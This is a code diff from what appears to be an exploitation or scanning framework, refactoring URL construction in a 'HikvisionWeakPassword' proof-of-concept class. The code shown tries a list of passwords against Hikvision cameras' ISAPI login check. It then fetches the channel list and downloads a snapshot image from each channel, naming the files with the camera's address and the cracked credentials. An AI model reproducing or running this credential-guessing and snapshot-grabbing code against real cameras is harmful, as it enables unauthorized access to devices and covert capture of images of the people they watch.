@@ -24,7 +24,7 @@ class HikvisionWeakPassword(POCTemplate):
             for password in self.config.passwords:
                 try:
                     r = self.session.get(
-                        url=f"http://{ip}:{port}/ISAPI/Security/userCheck",
+                        url=self.url(ip, port, "/ISAPI/Security/userCheck"),
                         auth=(user, password),
                         timeout=self.config.timeout,
                         headers=self.headers,
@@ -41,7 +41,7 @@ class HikvisionWeakPassword(POCTemplate):
         channels = 1
         try:
             res = self.session.get(
-                f"http://{ip}:{port}/ISAPI/Image/channels",
+                self.url(ip, port, "/ISAPI/Image/channels"),
                 auth=HTTPDigestAuth(user, password),
                 headers=self.headers,
                 timeout=self.config.timeout,
@@ -54,7 +54,7 @@ class HikvisionWeakPassword(POCTemplate):
         # Capture a snapshot from each available channel
         res_list = []
         for channel in range(1, channels + 1):
-            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
+            url = self.url(ip, port, f"/ISAPI/Streaming/channels/{channel}01/picture")
             img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
             res_list.append(
                 self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
